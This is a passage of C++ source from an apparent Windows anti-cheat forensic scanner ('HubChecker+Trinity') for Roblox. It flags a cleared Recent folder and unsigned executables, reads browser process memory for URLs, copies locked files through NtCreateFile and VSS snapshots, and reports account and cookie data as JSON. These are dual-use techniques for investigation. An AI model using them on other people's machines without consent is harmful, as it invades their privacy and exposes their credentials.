// ── Recent folder integrity (count-based cleared detection) ──────────────────
static string CheckRecentFolderIntegrity() {
    vector<string> results;
    WIN32_FIND_DATAA ufd;
    HANDLE uh = FindFirstFileA("C:\\Users\\*", &ufd);
    if (uh == INVALID_HANDLE_VALUE) return "Recent Folder: Could not enumerate users";
    do {
        if (!(ufd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        string uname = ufd.cFileName;
        if (uname == "." || uname == ".." || uname == "Public" ||
            uname == "Default" || uname == "Default User") continue;
        string recent = "C:\\Users\\" + uname +
            "\\AppData\\Roaming\\Microsoft\\Windows\\Recent";
        DWORD attr = GetFileAttributesA(recent.c_str());
        if (attr == INVALID_FILE_ATTRIBUTES || !(attr & FILE_ATTRIBUTE_DIRECTORY)) {
            results.push_back("Recent [" + uname + "]: folder missing");
            continue;
        }
        int count = 0;
        WIN32_FIND_DATAA fd;
        HANDLE h = FindFirstFileA((recent + "\\*").c_str(), &fd);
        if (h != INVALID_HANDLE_VALUE) {
            do {
                if (string(fd.cFileName) == "." || string(fd.cFileName) == "..") continue;
                count++;
            } while (FindNextFileA(h, &fd));
            FindClose(h);
        }
        if (count == 0)
            results.push_back("Recent [" + uname + "]: CLEARED — 0 items");
        else if (count < 5)
            results.push_back("Recent [" + uname + "]: SUSPICIOUS — only " +
                std::to_string(count) + " items");
        else
            results.push_back("Recent [" + uname + "]: OK — " + std::to_string(count) + " items");
    } while (FindNextFileA(uh, &ufd));
    FindClose(uh);
    if (results.empty()) return "Recent Folder: No user profiles found";
    string r = "Recent Folder Integrity:\n";
    for (auto& s : results) r += "  " + s + "\n";
    return r;
}

// ── Unsigned / suspicious executables in user-writable dirs ──────────────────
// Walks Desktop, Downloads, AppData and Temp for each user profile.
// Caps total files examined at 5 000 to prevent excessively long runtimes.
// Uses GetLongPathNameA to resolve junction points (e.g. "Application Data"
// → "Local") so the same file is never reported twice.
static string ScanUnsignedExecutablesInUserDirs() {
    vector<string> findings;
    std::set<string> seenPaths;   // canonical lowercase paths — prevents junction dups
    const char* exts[] = { ".exe", ".dll", ".sys", nullptr };
    int scanned = 0;

    // Directories that contain only legitimate OS-generated stub EXEs;
    // signing them is optional per Microsoft policy so they create noise.
    auto IsExcludedDir = [](const string& dirLow) -> bool {
        return dirLow.find("\\microsoft\\windowsapps") != string::npos;
        };

    std::function<void(const string&, int)> walkDir = [&](const string& dir, int depth) {
        if (depth > 2 || scanned >= 5000) return;
        if (IsExcludedDir(Lower(dir))) return;
        WIN32_FIND_DATAA fd;
        HANDLE h = FindFirstFileA((dir + "\\*").c_str(), &fd);
        if (h == INVALID_HANDLE_VALUE) return;
        do {
            if (scanned >= 5000) break;
            string fn = fd.cFileName;
            if (fn == "." || fn == "..") continue;
            string fp = dir + "\\" + fn;
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (depth < 2) walkDir(fp, depth + 1);
                continue;
            }
            // Extension filter
            string fnLow = Lower(fn);
            bool isExe = false;
            for (int i = 0; exts[i]; i++) {
                size_t el = strlen(exts[i]);
                if (fnLow.size() >= el &&
                    fnLow.compare(fnLow.size() - el, el, exts[i]) == 0)
                {
                    isExe = true; break;
                }
            }
            if (!isExe) continue;
            scanned++;
            // Resolve canonical (long) path to deduplicate junction points
            char canon[MAX_PATH * 2] = {};
            DWORD glen = GetLongPathNameA(fp.c_str(), canon, sizeof(canon));
            string canonPath = (glen > 0 && glen < sizeof(canon)) ? Lower(string(canon)) : Lower(fp);
            if (!seenPaths.insert(canonPath).second) continue;
            // Signature check
            int wn = MultiByteToWideChar(CP_ACP, 0, canon[0] ? canon : fp.c_str(), -1, nullptr, 0);
            wstring wp; if (wn > 1) { wp.resize(wn - 1); MultiByteToWideChar(CP_ACP, 0, canon[0] ? canon : fp.c_str(), -1, &wp[0], wn); }
            if (wp.empty()) continue;
            string signerName;
            SigStatus sig = CheckSignature(wp, &signerName);
            if (sig == SigStatus::Signed) continue;
            // Pattern scan for cheat-specific strings
            auto patterns = ScanFileForCheats(fp);
            string entry = "[" + SigStatusStr(sig) + "] " + (canon[0] ? string(canon) : fp);
            if (!signerName.empty()) entry += " | Signer: " + signerName;
            if (!patterns.empty()) {
                entry += " | Patterns:";
                for (auto& p2 : patterns) entry += " " + p2 + ";";
            }
            findings.push_back(entry);
        } while (FindNextFileA(h, &fd));
        FindClose(h);
        };

    WIN32_FIND_DATAA ufd;
    HANDLE uh = FindFirstFileA("C:\\Users\\*", &ufd);
    if (uh != INVALID_HANDLE_VALUE) {
        do {
            if (!(ufd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
            string uname = ufd.cFileName;
            if (uname == "." || uname == ".." || uname == "Public" ||
                uname == "Default" || uname == "Default User") continue;
            string root = "C:\\Users\\" + uname;
            for (const auto& sub : {
                root + "\\Desktop",
                root + "\\Downloads",
                root + "\\AppData\\Local\\Temp",
                root + "\\AppData\\Roaming",
                root + "\\AppData\\Local"
                }) {
                DWORD attr = GetFileAttributesA(sub.c_str());
                if (attr == INVALID_FILE_ATTRIBUTES || !(attr & FILE_ATTRIBUTE_DIRECTORY)) continue;
                walkDir(sub, 0);
            }
        } while (FindNextFileA(uh, &ufd) && scanned < 5000);
        FindClose(uh);
    }

    string suffix = " (" + std::to_string(scanned) + " file(s) examined)";
    if (findings.empty())
        return "Unsigned Executables: None found in user dirs" + suffix;
    string r = "Unsigned Executables in user dirs (" +
        std::to_string(findings.size()) + " found" + suffix + "):\n";
    for (auto& f : findings) r += "  " + f + "\n";
    return r;
}

// ── Browser process memory URL scanning ──────────────────────────────────────
static string ScanBrowserMemory() {
    // Scan Chrome, Edge, Firefox, Brave for suspicious URLs
    static const std::set<string> browserExes = {
        "chrome.exe", "msedge.exe", "firefox.exe", "brave.exe",
        "opera.exe", "vivaldi.exe", "waterfox.exe"
    };
    vector<string> found;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return "Browser Memory: Could not snapshot processes";
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(snap, &pe)) {
        do {
            string exeName = Lower(WtoS(pe.szExeFile));
            if (!browserExes.count(exeName)) continue;
            HANDLE h = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
                FALSE, pe.th32ProcessID);
            if (!h) continue;
            MEMORY_BASIC_INFORMATION mbi = {};
            LPVOID addr = nullptr;
            while (VirtualQueryEx(h, addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
                if (mbi.State == MEM_COMMIT && mbi.RegionSize < 0x800000) {
                    vector<BYTE> buf(mbi.RegionSize);
                    SIZE_T br = 0;
                    if (ReadProcessMemory(h, mbi.BaseAddress, buf.data(), mbi.RegionSize, &br) && br > 0) {
                        string chunk(buf.begin(), buf.begin() + br);
                        for (const auto& pfx : SUSPICIOUS_URL_PREFIXES) {
                            size_t pos = 0;
                            while ((pos = chunk.find(pfx, pos)) != string::npos) {
                                size_t end = chunk.size();
                                for (size_t k = pos; k < chunk.size(); ++k) {
                                    unsigned char ch = (unsigned char)chunk[k];
                                    if (ch < 0x20 || ch == '"' || ch == '\'' ||
                                        ch == '<' || ch == '>') {
                                        end = k; break;
                                    }
                                }
                                string url = chunk.substr(pos, end - pos);
                                // Skip bare prefix matches (no real path component)
                                // These arise when the prefix strings themselves live in
                                // memory (e.g. from HubChecker's own string table) and
                                // produce entries like "https://pastebin.com\" with no
                                // meaningful URL following the host.
                                if (url.size() <= pfx.size() + 1) {
                                    pos += pfx.size(); continue;
                                }
                                string entry = "[" + exeName + " PID " +
                                    std::to_string(pe.th32ProcessID) + "] " + url;
                                // Deduplicate garbage-extended copies: if any already-seen URL
                                // is a prefix of this new URL (same base URL but with binary
                                // garbage appended in memory), skip this one as a duplicate.
                                // Also replace any existing entry that is a garbage extension
                                // of this (shorter, cleaner) URL.
                                bool isDup = false;
                                for (size_t fi = 0; fi < found.size(); ++fi) {
                                    size_t pidEnd = found[fi].find("] ");
                                    string existUrl = (pidEnd != string::npos)
                                        ? found[fi].substr(pidEnd + 2) : found[fi];
                                    if (existUrl == url) { isDup = true; break; }
                                    // existing is a prefix of new → new is garbage-extended, skip
                                    if (!existUrl.empty() && url.find(existUrl) == 0)
                                    {
                                        isDup = true; break;
                                    }
                                    // new is a prefix of existing → existing was garbage-extended,
                                    // replace it with this cleaner shorter URL
                                    if (!url.empty() && existUrl.find(url) == 0) {
                                        found[fi] = entry; isDup = true; break;
                                    }
                                }
                                if (!isDup && !IsMediaUrl(url))
                                    found.push_back(entry);
                                pos += pfx.size();
                            }
                        }
                    }
                }
                addr = (LPVOID)((uintptr_t)mbi.BaseAddress + mbi.RegionSize);
            }
            CloseHandle(h);
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    if (found.empty()) return "Browser Memory: No suspicious URLs found in browser processes";
    string r = "Browser Memory - Suspicious URLs:\n";
    for (auto& u : found) r += "  " + u + "\n";
    return r;
}

// =========================================================================
//  Trinity: JSON helpers + result serializer
// =========================================================================
struct TrinityResults {
    // Memory / live process
    string robloxMemory, injectedModules, discordMemory, browserMemory;
    // Roblox data
    vector<string> robloxLogs, robloxFlags;
    // Quick native checks
    string runKeys;
    vector<string> recentItems, userAssist;
    // Integrity checks
    string prefetchIntegrity, amcacheIntegrity, shimcacheIntegrity, srumIntegrity;
    string defenderIntegrity, bamIntegrity, usbHistory, systemRestore, recentFolderIntegrity;
    // New checks
    string servicesCheck, unsignedExes;
};

static string JStr(const string& s) {
    string r = "\"";
    for (char c : s) {
        if (c == '"')  r += "\\\"";
        else if (c == '\\') r += "\\\\";
        else if (c == '\n') r += "\\n";
        else if (c == '\r') r += "\\r";
        else if (c == '\t') r += "\\t";
        else r += c;
    }
    r += "\""; return r;
}

static string JArr(const vector<string>& v) {
    string r = "[";
    for (size_t i = 0; i < v.size(); ++i) { if (i) r += ","; r += JStr(v[i]); }
    r += "]"; return r;
}

static string BuildTrinityJson(const TrinityResults& tr, const SystemInfo& info,
    const string& logFilePath) {
    std::ostringstream j;
    j << "{\n";
    j << "  \"tool\": \"HubChecker+Trinity\",\n";
    j << "  \"timestamp\": " << JStr(TrinityNowString()) << ",\n";
    j << "  \"logFile\": " << JStr(logFilePath) << ",\n";

    j << "  \"systemInfo\": {\n";
    j << "    \"hostname\": " << JStr(info.hostname) << ",\n";
    j << "    \"username\": " << JStr(info.username) << ",\n";
    j << "    \"os_version\": " << JStr(info.osVersion) << ",\n";
    j << "    \"windows_install_date\": " << JStr(info.windowsInstallDate) << ",\n";
    j << "    \"roblox_accounts\": " << JArr(info.robloxAccounts) << ",\n";
    j << "    \"discord_accounts\": " << JArr(info.discordAccounts) << ",\n";
    j << "    \"roblox_cookie_notes\": " << JArr(info.robloxCookieNotes) << ",\n";
    j << "    \"roblox_profile_urls\": " << JArr(info.robloxProfileUrls) << "\n";
    j << "  },\n";

    j << "  \"memoryScan\": {\n";
    j << "    \"robloxMemory\": " << JStr(tr.robloxMemory) << ",\n";
    j << "    \"injectedModules\": " << JStr(tr.injectedModules) << ",\n";
    j << "    \"discordMemory\": " << JStr(tr.discordMemory) << ",\n";
    j << "    \"browserMemory\": " << JStr(tr.browserMemory) << "\n";
    j << "  },\n";

    j << "  \"robloxData\": {\n";
    j << "    \"robloxLogs\": " << JArr(tr.robloxLogs) << ",\n";
    j << "    \"robloxFlags\": " << JArr(tr.robloxFlags) << "\n";
    j << "  },\n";

    j << "  \"nativeChecks\": {\n";
    j << "    \"runKeys\": " << JStr(tr.runKeys) << ",\n";
    j << "    \"recentItems\": " << JArr(tr.recentItems) << ",\n";
    j << "    \"userAssist\": " << JArr(tr.userAssist) << "\n";
    j << "  },\n";

    j << "  \"integrityChecks\": {\n";
    j << "    \"prefetchIntegrity\": " << JStr(tr.prefetchIntegrity) << ",\n";
    j << "    \"amcacheIntegrity\": " << JStr(tr.amcacheIntegrity) << ",\n";
    j << "    \"shimcacheIntegrity\": " << JStr(tr.shimcacheIntegrity) << ",\n";
    j << "    \"srumIntegrity\": " << JStr(tr.srumIntegrity) << ",\n";
    j << "    \"defenderIntegrity\": " << JStr(tr.defenderIntegrity) << ",\n";
    j << "    \"bamIntegrity\": " << JStr(tr.bamIntegrity) << ",\n";
    j << "    \"usbHistory\": " << JStr(tr.usbHistory) << ",\n";
    j << "    \"systemRestore\": " << JStr(tr.systemRestore) << ",\n";
    j << "    \"recentFolderIntegrity\": " << JStr(tr.recentFolderIntegrity) << ",\n";
    j << "    \"servicesCheck\": " << JStr(tr.servicesCheck) << ",\n";
    j << "    \"unsignedExes\": " << JStr(tr.unsignedExes) << "\n";
    j << "  }\n";
    j << "}\n";
    return j.str();
}

// =========================================================================
//  Tool configs
// =========================================================================
struct ToolCfg { const wchar_t* name; bool hasQuietFlag; };
static const ToolCfg CFGS[] = {
    { L"AmcacheParser.exe",         false },
    { L"AppCompatCacheParser.exe",  false },
    { L"PECmd.exe",                 true  },
    { L"MFTECmd.exe",               false },
    { L"JLECmd.exe",                true  },
    { L"LECmd.exe",                 true  },
    { L"RBCmd.exe",                 false },
    { L"SBECmd.exe",                false },
    { L"EvtxECmd.exe",              false },
    { L"RecentFileCacheParser.exe", false },
    { L"SrumECmd.exe",              false },
    { L"WxTCmd.exe",                false },
    { L"SumECmd.exe",               false },
    { L"bstrings.exe",              false },
    { L"RECmd.exe",                  false },
};

// =========================================================================
//  Logging
// =========================================================================
static std::ofstream     gLog;
static CRITICAL_SECTION  gLogCs;

thread_local static vector<string> tl_logBuf;
thread_local static bool           tl_logDefer = false;

static void Log(const string& msg) {
    if (tl_logDefer) { tl_logBuf.push_back(msg); return; }
    EnterCriticalSection(&gLogCs);
    std::cout << msg << "\n";
    if (gLog.is_open()) gLog << msg << "\n";
    LeaveCriticalSection(&gLogCs);
}
static void LogFlush() {
    EnterCriticalSection(&gLogCs);
    for (auto& m : tl_logBuf) {
        std::cout << m << "\n";
        if (gLog.is_open()) gLog << m << "\n";
    }
    tl_logBuf.clear();
    LeaveCriticalSection(&gLogCs);
    tl_logDefer = false;
}

// =========================================================================
//  Helpers
// =========================================================================
static wstring TmpDir() { wchar_t b[MAX_PATH]; GetTempPathW(MAX_PATH, b); return b; }

// FIX #2: WtoS - replace the old lossy `(char)*p` cast with WideCharToMultiByte.
//
// The original code did:
//   for (const wchar_t* p = w; *p; p++) s += (char)*p;
// This truncated every wchar_t to 8 bits, silently corrupting any non-ASCII
// character (e.g. accented letters in usernames, Cyrillic paths, East-Asian
// directory names). The corruption made dedup-key comparisons and keyword
// searches silently fail for those paths.
//
// WideCharToMultiByte(CP_UTF8) preserves the full Unicode codepoint as a
// proper UTF-8 sequence so all comparisons and keyword searches work correctly.
static string WtoS(const wchar_t* w) {
    if (!w || !*w) return "";
    int needed = WideCharToMultiByte(CP_UTF8, 0, w, -1, nullptr, 0, nullptr, nullptr);
    if (needed <= 1) return "";
    string s(needed - 1, '\0');
    WideCharToMultiByte(CP_UTF8, 0, w, -1, &s[0], needed, nullptr, nullptr);
    return s;
}

static void EnablePrivilege(const wchar_t* name) {
    HANDLE hTok = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok)) return;
    TOKEN_PRIVILEGES tp = {};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    LookupPrivilegeValueW(nullptr, name, &tp.Privileges[0].Luid);
    AdjustTokenPrivileges(hTok, FALSE, &tp, sizeof(tp), nullptr, nullptr);
    CloseHandle(hTok);
}

static vector<wstring> EnumUsers() {
    vector<wstring> users;
    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW(L"C:\\Users\\*", &fd);
    if (h == INVALID_HANDLE_VALUE) return users;
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        wstring n = fd.cFileName;
        if (n == L"." || n == L".." ||
            n == L"Public" || n == L"Default" ||
            n == L"Default User" || n == L"All Users") continue;
        users.push_back(n);
    } while (FindNextFileW(h, &fd));
    FindClose(h);
    return users;
}

// =========================================================================
//  NT native open (bypasses share-mode locks)
// =========================================================================
static HANDLE NtOpenLockedFile(const wstring& win32Path) {
    if (!pNtCreateFile || !pRtlInitUnicodeString) return INVALID_HANDLE_VALUE;
    wstring ntPath = L"\\??\\" + win32Path;
    UNICODE_STRING uPath = {};
    pRtlInitUnicodeString(&uPath, ntPath.c_str());
    OBJECT_ATTRIBUTES oa = {};
    oa.Length = sizeof(oa);
    oa.ObjectName = &uPath;
    oa.Attributes = OBJ_CASE_INSENSITIVE;
    IO_STATUS_BLOCK iosb = {};
    HANDLE hFile = INVALID_HANDLE_VALUE;
    NTSTATUS st = pNtCreateFile(&hFile,
        FILE_READ_DATA | FILE_READ_ATTRIBUTES | SYNCHRONIZE,
        &oa, &iosb, nullptr, FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE | FILE_SEQUENTIAL_ONLY,
        nullptr, 0);
    return NT_SUCCESS(st) ? hFile : INVALID_HANDLE_VALUE;
}

static bool StreamCopy(HANDLE hSrc, HANDLE hDst, LONGLONG limit = -1) {
    vector<char> buf(1024 * 1024);
    DWORD r, w; LONGLONG total = 0; bool ok = true;
    while (ok) {
        DWORD toRead = (DWORD)buf.size();
        if (limit >= 0 && total + toRead > limit) toRead = (DWORD)(limit - total);
        if (toRead == 0) break;
        if (!ReadFile(hSrc, buf.data(), toRead, &r, nullptr) || r == 0) break;
        if (!WriteFile(hDst, buf.data(), r, &w, nullptr) || w != r) { ok = false; break; }
        total += w;
        if (limit >= 0 && total >= limit) break;
    }
    FlushFileBuffers(hDst);
    return ok && total > 0;
}

static bool CopyLockedFile(const wstring& src, const wstring& dst) {
    HANDLE hSrc = NtOpenLockedFile(src);
    if (hSrc == INVALID_HANDLE_VALUE) {
        hSrc = CreateFileW(src.c_str(), GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            nullptr, OPEN_EXISTING,
            FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_SEQUENTIAL_SCAN, nullptr);
    }
    if (hSrc == INVALID_HANDLE_VALUE) {
        if (CopyFileW(src.c_str(), dst.c_str(), FALSE)) {
            Log("  [+] CopyFileW succeeded");
            return true;
        }
        Log("  [!] All open methods failed for: " + WtoS(src.c_str()) +
            " (err " + std::to_string(GetLastError()) + ")");
        return false;
    }
    HANDLE hDst = CreateFileW(dst.c_str(), GENERIC_WRITE, 0,
        nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hDst == INVALID_HANDLE_VALUE) { CloseHandle(hSrc); return false; }
    bool ok = StreamCopy(hSrc, hDst);
    CloseHandle(hDst); CloseHandle(hSrc);
    if (!ok) { DeleteFileW(dst.c_str()); Log("  [!] Copy failed"); return false; }
    HANDLE hCheck = CreateFileW(dst.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
        OPEN_EXISTING, 0, nullptr);
    if (hCheck != INVALID_HANDLE_VALUE) {
        LARGE_INTEGER sz = {}; GetFileSizeEx(hCheck, &sz); CloseHandle(hCheck);
        Log("  [+] Copied " + std::to_string(sz.QuadPart) + " bytes");
    }
    return true;
}

static string Capture(wstring fullcmd);

// =========================================================================
//  VSS helpers
// =========================================================================
static wstring CreateVssSnapshot() {
    Log("  [*] Creating VSS snapshot of C: via PowerShell ...");
    string out = Capture(
        L"powershell.exe -NoProfile -NonInteractive -Command \""
        L"$s=(Get-WmiObject -List Win32_ShadowCopy).Create('C:\\\\','ClientAccessible');"
        L"$id=$s.ShadowID;$sc=Get-WmiObject Win32_ShadowCopy|Where{$_.ID -eq $id};"
        L"Write-Output $sc.DeviceObject\"");
    Log("  [vss raw] " + out.substr(0, 300));
    while (!out.empty() && (out.back() == '\r' || out.back() == '\n' || out.back() == ' '))
        out.pop_back();
    if (out.find("GLOBALROOT") == string::npos) {
        Log("  [!] VSS snapshot failed: " + out.substr(0, 200));
        return L"";
    }
    wstring devPath(out.begin(), out.end());
    Log("  [+] VSS device: " + WtoS(devPath.c_str()));
    return devPath;
}

static void DeleteVssSnapshot(const wstring& devPath) {
    if (devPath.empty()) return;
    wstring cmd = L"powershell.exe -NoProfile -NonInteractive -Command "
        L"\"$sc=Get-WmiObject Win32_ShadowCopy|Where{$_.DeviceObject -eq '" +
        devPath + L"'};if($sc){$sc.Delete()}\"";
    Capture(cmd);
}

static bool CopyFromVss(const wstring& vssDevice, const wstring& relPath, const wstring& dst) {
    wstring vssSrc = vssDevice + L"\\" + relPath;
    HANDLE hSrc = CreateFileW(vssSrc.c_str(), GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr, OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_SEQUENTIAL_SCAN, nullptr);
    if (hSrc == INVALID_HANDLE_VALUE) {
        Log("  [!] VSS open failed (err " + std::to_string(GetLastError()) + ")");
        return false;
    }
    HANDLE hDst = CreateFileW(dst.c_str(), GENERIC_WRITE, 0,
        nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hDst == INVALID_HANDLE_VALUE) {
        DWORD e = GetLastError();
        Log("  [!] VSS copy: cannot create dest (err " + std::to_string(e) + "): " +
            WtoS(dst.c_str()));
        CloseHandle(hSrc); return false;
    }
    bool ok = StreamCopy(hSrc, hDst);
    CloseHandle(hDst); CloseHandle(hSrc);
    if (!ok) { DeleteFileW(dst.c_str()); return false; }
    HANDLE hCheck = CreateFileW(dst.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
        OPEN_EXISTING, 0, nullptr);
    if (hCheck != INVALID_HANDLE_VALUE) {
        LARGE_INTEGER sz = {}; GetFileSizeEx(hCheck, &sz); CloseHandle(hCheck);
        Log("  [+] VSS copy: " + std::to_string(sz.QuadPart) + " bytes");
    }
    return true;
}

// =========================================================================
//  Process runner (captures stdout+stderr)
// =========================================================================
static string Capture(wstring fullcmd) {
    SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
    HANDLE r, w;
    CreatePipe(&r, &w, &sa, 0);
    SetHandleInformation(r, HANDLE_FLAG_INHERIT, 0);
    // Open NUL as stdin so child processes (including .NET tools) never inherit
    // the parent's console input buffer and block waiting for user input.
    HANDLE hNulIn = CreateFileW(L"NUL", GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE, &sa, OPEN_EXISTING, 0, nullptr);
    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = hNulIn; si.hStdOutput = w; si.hStdError = w;
    PROCESS_INFORMATION pi = {};
    BOOL ok = CreateProcessW(nullptr, fullcmd.data(), nullptr, nullptr,
        TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(w);
    if (hNulIn != INVALID_HANDLE_VALUE) CloseHandle(hNulIn);
    if (!ok) { CloseHandle(r); return "[CreateProcess failed: " + std::to_string(GetLastError()) + "]"; }
    string out; char buf[4096]; DWORD n;
    while (ReadFile(r, buf, sizeof(buf), &n, nullptr) && n) out.append(buf, n);
    DWORD wr = WaitForSingleObject(pi.hProcess, 900000);
    if (wr == WAIT_TIMEOUT) { Log("  [!] Timed out"); TerminateProcess(pi.hProcess, 1); }
    DWORD exit = 0; GetExitCodeProcess(pi.hProcess, &exit);
    if (exit != 0) Log("  [!] Exit code " + std::to_string(exit));
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread); CloseHandle(r);
    return out;
}

// CaptureInDir: like Capture() but sets the working directory to `workDir`.
// Required for .NET single-file executables (e.g. WxTCmd) that resolve
// companion DLLs relative to the process working directory rather than the
// executable's own directory.
static string CaptureInDir(wstring fullcmd, const wstring& workDir) {
    SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
    HANDLE r, w;
    CreatePipe(&r, &w, &sa, 0);
    SetHandleInformation(r, HANDLE_FLAG_INHERIT, 0);
    HANDLE hNulIn = CreateFileW(L"NUL", GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE, &sa, OPEN_EXISTING, 0, nullptr);
    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = hNulIn; si.hStdOutput = w; si.hStdError = w;
    PROCESS_INFORMATION pi = {};
    const wchar_t* wd = workDir.empty() ? nullptr : workDir.c_str();
    BOOL ok = CreateProcessW(nullptr, fullcmd.data(), nullptr, nullptr,
        TRUE, CREATE_NO_WINDOW, nullptr, wd, &si, &pi);
    CloseHandle(w);
    if (hNulIn != INVALID_HANDLE_VALUE) CloseHandle(hNulIn);
    if (!ok) { CloseHandle(r); return "[CreateProcess failed: " + std::to_string(GetLastError()) + "]"; }
    string out; char buf[4096]; DWORD n;
    while (ReadFile(r, buf, sizeof(buf), &n, nullptr) && n) out.append(buf, n);
    DWORD wr = WaitForSingleObject(pi.hProcess, 900000);
    if (wr == WAIT_TIMEOUT) { Log("  [!] Timed out"); TerminateProcess(pi.hProcess, 1); }
    DWORD exit = 0; GetExitCodeProcess(pi.hProcess, &exit);
    if (exit != 0) Log("  [!] Exit code " + std::to_string(exit));
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread); CloseHandle(r);
    return out;
}

static void RunDetached(const wstring& fullcmd, DWORD timeoutMs = 900000) {
    SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES;
    HANDLE hNulIn = CreateFileW(L"NUL", GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE, &sa, OPEN_EXISTING, 0, nullptr);
    HANDLE hNulOut = CreateFileW(L"NUL", GENERIC_WRITE,
        FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
    si.hStdInput = hNulIn; si.hStdOutput = hNulOut; si.hStdError = hNulOut;
    PROCESS_INFORMATION pi = {};
    wstring cmd = fullcmd;
    BOOL ok = CreateProcessW(nullptr, cmd.data(), nullptr, nullptr,
        TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    if (hNulIn != INVALID_HANDLE_VALUE) CloseHandle(hNulIn);
    if (hNulOut != INVALID_HANDLE_VALUE) CloseHandle(hNulOut);
    if (!ok) { Log("  [!] CreateProcess failed: " + std::to_string(GetLastError())); return; }
    Log("  [*] Waiting up to " + std::to_string(timeoutMs / 60000) + " min ...");
    DWORD wr = WaitForSingleObject(pi.hProcess, timeoutMs);
    if (wr == WAIT_TIMEOUT) { Log("  [!] Timed out - terminating"); TerminateProcess(pi.hProcess, 1); }
    else { DWORD ec = 0; GetExitCodeProcess(pi.hProcess, &ec); Log("  [*] Done (exit=" + std::to_string(ec) + ")"); }
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
}

// =========================================================================
//  CSV helpers
// =========================================================================
static vector<string> SplitCSV(const string& line) {
    vector<string> fields; string field; bool inQ = false;
    for (char c : line) {
        if (c == '"') { inQ = !inQ; continue; }
        if (c == ',' && !inQ) { fields.push_back(field); field.clear(); continue; }
        field += c;
    }
    fields.push_back(field); return fields;
}

static int Col(const vector<string>& h, const string& name) {
    string nl = Lower(name);
    for (int i = 0; i < (int)h.size(); i++) if (Lower(h[i]).find(nl) != string::npos) return i;
    return -1;
}

static string Get(const vector<string>& row, int idx) {
    if (idx < 0 || idx >= (int)row.size()) return "";
    string s = row[idx];
    size_t a = s.find_first_not_of(" \t\r\n"), b = s.find_last_not_of(" \t\r\n");
    return (a == string::npos) ? "" : s.substr(a, b - a + 1);
}

static string FileNameOnly(const string& path) {
    size_t s = path.find_last_of("/\\");
    return (s == string::npos) ? path : path.substr(s + 1);
}

// Returns true if the path ends with a PE/script executable extension.
// Used to filter MFT/USN keyword hits so non-executable files (.py, .html,
// .tcl, .dds, .dat, timezone data, directories, etc.) are not reported.
static bool IsExecutableExtension(const string& path) {
    string pl = Lower(path);
    const char* exts[] = {
        ".exe", ".dll", ".sys", ".bat", ".cmd",
        ".ps1", ".vbs", ".scr", ".com", ".msi", nullptr
    };
    for (int i = 0; exts[i]; i++) {
        size_t el = strlen(exts[i]);
        if (pl.size() >= el && pl.compare(pl.size() - el, el, exts[i]) == 0)
            return true;
    }
    return false;
}

// Returns true only if kw appears as a whole token in text — i.e. the
// character immediately before and after the match (if present) must be
// non-alphanumeric.  This prevents "wave" from matching "aniwave",
// "shockwave", or "qwavecache", and "swift" from matching paths where the
// keyword is glued to other alphanumeric characters.
static bool MatchesWholeWord(const string& text, const string& kw) {
    if (kw.empty()) return false;
    size_t pos = 0;
    while ((pos = text.find(kw, pos)) != string::npos) {
        bool lOk = (pos == 0 || !isalnum((unsigned char)text[pos - 1]));
        bool rOk = (pos + kw.size() >= text.size() ||
            !isalnum((unsigned char)text[pos + kw.size()]));
        if (lOk && rOk) return true;
        pos++;
    }
    return false;
}

// =========================================================================
//  HitInfo and ResolveHit
// =========================================================================
struct HitInfo {
    string keyword, tool, path, eventType;
    vector<std::pair<string, string>> details;
};

static HitInfo ResolveHit(const vector<string>& headers, const vector<string>& row,
    const string& toolLabel, const string& keyword, const string& path)
{
    HitInfo h; h.keyword = keyword; h.tool = toolLabel; h.path = path;
    string tl = Lower(toolLabel);
    auto add = [&](const string& lbl, const string& col) {
        string v = Get(row, Col(headers, col));
